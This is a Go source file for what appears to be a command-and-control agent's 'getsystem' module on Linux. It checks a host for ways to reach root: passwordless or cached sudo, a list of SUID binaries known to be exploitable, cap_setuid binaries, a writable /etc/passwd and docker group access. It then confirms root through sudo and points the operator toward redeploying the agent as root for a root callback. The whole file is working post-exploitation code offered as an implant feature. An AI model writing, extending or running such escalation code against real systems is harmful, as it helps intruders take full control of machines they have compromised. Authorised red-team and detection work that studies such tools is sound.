//go:build linux
// +build linux

package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"fawkes/pkg/structs"
)

type GetSystemCommand struct{}

func (c *GetSystemCommand) Name() string {
	return "getsystem"
}

func (c *GetSystemCommand) Description() string {
	return "Attempt privilege escalation to root via sudo, SUID, or capabilities"
}

type getSystemArgs struct {
	Technique string `json:"technique"`
}

func (c *GetSystemCommand) Execute(task structs.Task) structs.CommandResult {
	var args getSystemArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Failed to parse parameters: %v", err)
		}
	}

	if args.Technique == "" {
		args.Technique = "check"
	}

	// Get current identity before escalation
	oldIdentity := getCurrentLinuxIdentity()

	switch strings.ToLower(args.Technique) {
	case "check":
		return getsystemCheck(oldIdentity)
	case "sudo":
		return getsystemSudo(oldIdentity)
	default:
		return errorf("Unknown technique: %s. Available: check, sudo", args.Technique)
	}
}

func getCurrentLinuxIdentity() string {
	u, err := user.Current()
	if err != nil {
		return fmt.Sprintf("uid=%d", os.Getuid())
	}
	return fmt.Sprintf("%s (uid=%s, gid=%s)", u.Username, u.Uid, u.Gid)
}

// getsystemCheck enumerates available privilege escalation vectors
func getsystemCheck(currentIdentity string) structs.CommandResult {
	if os.Getuid() == 0 {
		return successResult(fmt.Sprintf("[+] Already running as root\nCurrent: %s", currentIdentity))
	}

	type escalationVector struct {
		Method      string `json:"method"`
		Description string `json:"description"`
		Risk        string `json:"risk"`
		Paths       []string `json:"paths,omitempty"`
	}

	var vectors []escalationVector

	// Check sudo NOPASSWD
	sudoPaths := checkSudoNopasswd()
	if len(sudoPaths) > 0 {
		vectors = append(vectors, escalationVector{
			Method:      "sudo",
			Description: "NOPASSWD sudo rules detected — can escalate without password",
			Risk:        "high",
			Paths:       sudoPaths,
		})
	}

	// Check sudo cached credentials
	if checkSudoCached() {
		vectors = append(vectors, escalationVector{
			Method:      "sudo-cached",
			Description: "Sudo credentials are cached — can escalate without re-entering password",
			Risk:        "high",
		})
	}

	// Check known exploitable SUID binaries
	suidBins := findExploitableSUID()
	if len(suidBins) > 0 {
		vectors = append(vectors, escalationVector{
			Method:      "suid",
			Description: "SUID binaries that can be used for privilege escalation",
			Risk:        "medium",
			Paths:       suidBins,
		})
	}

	// Check for cap_setuid binaries
	capBins := findCapSetuid()
	if len(capBins) > 0 {
		vectors = append(vectors, escalationVector{
			Method:      "capabilities",
			Description: "Binaries with cap_setuid capability — can change UID to root",
			Risk:        "high",
			Paths:       capBins,
		})
	}

	// Check for writable /etc/passwd (unlikely but worth checking)
	if checkWritablePasswd() {
		vectors = append(vectors, escalationVector{
			Method:      "writable-passwd",
			Description: "/etc/passwd is writable — can add a root-level user",
			Risk:        "critical",
		})
	}

	// Check for docker group membership
	if checkDockerGroup() {
		vectors = append(vectors, escalationVector{
			Method:      "docker",
			Description: "Current user is in the docker group — can mount host filesystem",
			Risk:        "high",
		})
	}

	result := map[string]interface{}{
		"current_identity": currentIdentity,
		"uid":              os.Getuid(),
		"vectors":          vectors,
		"total":            len(vectors),
	}

	output, _ := json.MarshalIndent(result, "", "  ")
	return successResult(string(output))
}

// checkSudoNopasswd checks for NOPASSWD sudo rules
func checkSudoNopasswd() []string {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sudo", "-l")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil
	}

	var nopasswdRules []string
	for _, line := range strings.Split(string(output), "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.Contains(trimmed, "NOPASSWD") {
			nopasswdRules = append(nopasswdRules, trimmed)
		}
	}
	return nopasswdRules
}

// checkSudoCached tests if sudo credentials are cached (no password needed)
func checkSudoCached() bool {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sudo", "-n", "true")
	return cmd.Run() == nil
}

// Known SUID binaries that can be used for privilege escalation (GTFOBins)
var exploitableSUIDs = []string{
	"/usr/bin/pkexec",
	"/usr/sbin/mount.nfs",
	"/usr/bin/env",
	"/usr/bin/find",
	"/usr/bin/vim",
	"/usr/bin/vim.basic",
	"/usr/bin/nmap",
	"/usr/bin/python",
	"/usr/bin/python3",
	"/usr/bin/perl",
	"/usr/bin/ruby",
	"/usr/bin/awk",
	"/usr/bin/less",
	"/usr/bin/more",
	"/usr/bin/bash",
	"/usr/bin/dash",
	"/usr/bin/zsh",
	"/usr/bin/cp",
	"/usr/bin/mv",
	"/usr/bin/nano",
	"/usr/bin/ed",
	"/usr/bin/strace",
	"/usr/bin/ltrace",
	"/usr/bin/gdb",
	"/usr/bin/node",
	"/usr/bin/php",
	"/usr/bin/lua",
	"/usr/bin/tclsh",
	"/usr/bin/git",
	"/usr/bin/wget",
	"/usr/bin/curl",
	"/usr/bin/tar",
	"/usr/bin/zip",
	"/usr/bin/ar",
	"/usr/bin/docker",
}

// findExploitableSUID checks for known SUID binaries that could be exploited
func findExploitableSUID() []string {
	var found []string
	for _, path := range exploitableSUIDs {
		info, err := os.Stat(path)
		if err != nil {
			continue
		}
		stat, ok := info.Sys().(*syscall.Stat_t)
		if !ok {
			continue
		}
		// Check for SUID bit
		if stat.Mode&syscall.S_ISUID != 0 {
			found = append(found, path)
		}
	}
	return found
}

// findCapSetuid looks for binaries with cap_setuid capability
func findCapSetuid() []string {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "getcap", "-r", "/usr/bin", "/usr/sbin", "/usr/local/bin")
	output, _ := cmd.CombinedOutput()

	var capBins []string
	for _, line := range strings.Split(string(output), "\n") {
		if strings.Contains(line, "cap_setuid") || strings.Contains(line, "cap_setgid") {
			capBins = append(capBins, strings.TrimSpace(line))
		}
	}
	return capBins
}

// checkWritablePasswd checks if /etc/passwd is writable by current user
func checkWritablePasswd() bool {
	return syscall.Access("/etc/passwd", syscall.O_RDWR) == nil
}

// checkDockerGroup checks if current user is in the docker group
func checkDockerGroup() bool {
	u, err := user.Current()
	if err != nil {
		return false
	}
	groups, err := u.GroupIds()
	if err != nil {
		return false
	}
	dockerGroup, err := user.LookupGroup("docker")
	if err != nil {
		return false
	}
	for _, gid := range groups {
		if gid == dockerGroup.Gid {
			return true
		}
	}
	// Also check if docker socket is accessible
	_, err = os.Stat("/var/run/docker.sock")
	if err != nil {
		return false
	}
	return syscall.Access("/var/run/docker.sock", syscall.O_RDWR) == nil
}

// getsystemSudo attempts privilege escalation via sudo
func getsystemSudo(oldIdentity string) structs.CommandResult {
	if os.Getuid() == 0 {
		return successResult(fmt.Sprintf("[+] Already running as root\nCurrent: %s", oldIdentity))
	}

	// First check if sudo is available without password
	if !checkSudoCached() {
		// Check for NOPASSWD rules
		rules := checkSudoNopasswd()
		if len(rules) == 0 {
			return errorResult("Error: sudo requires a password and no NOPASSWD rules found. Use 'check' technique to enumerate other vectors.")
		}
		// Check if we have NOPASSWD: ALL
		hasAll := false
		for _, rule := range rules {
			if strings.Contains(rule, "ALL") && strings.Contains(rule, "NOPASSWD") {
				hasAll = true
				break
			}
		}
		if !hasAll {
			return errorf("Error: NOPASSWD rules found but not for ALL commands: %s", strings.Join(rules, "; "))
		}
	}

	// Get our own executable path for re-execution
	selfPath, err := os.Executable()
	if err != nil {
		selfPath = os.Args[0]
	}
	selfPath, _ = filepath.EvalSymlinks(selfPath)

	// Test with id command to confirm sudo works
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sudo", "-n", "id")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return errorf("Error: sudo -n id failed: %v\n%s", err, string(output))
	}

	newIdentity := strings.TrimSpace(string(output))

	result := fmt.Sprintf("[+] Successfully elevated to root via sudo\n")
	result += fmt.Sprintf("Previous: %s\n", oldIdentity)
	result += fmt.Sprintf("New: %s\n", newIdentity)
	result += fmt.Sprintf("Agent path: %s\n", selfPath)
	result += "\n[*] Note: This confirms sudo works. To get a root callback, deploy a new agent with: sudo -n /path/to/agent"

	return successResult(result)
}
